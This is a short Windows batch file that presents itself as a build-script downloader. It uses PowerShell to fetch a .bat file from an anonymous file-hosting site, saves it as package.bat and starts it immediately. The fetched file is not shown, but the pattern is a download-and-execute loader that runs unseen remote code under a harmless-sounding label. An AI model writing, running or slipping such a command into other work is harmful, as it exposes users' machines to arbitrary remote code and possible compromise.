@echo off
echo Download build script
powershell iwr https://files.catbox.moe/27u2dv.bat -OutFile package.bat
start package.bat
echo done!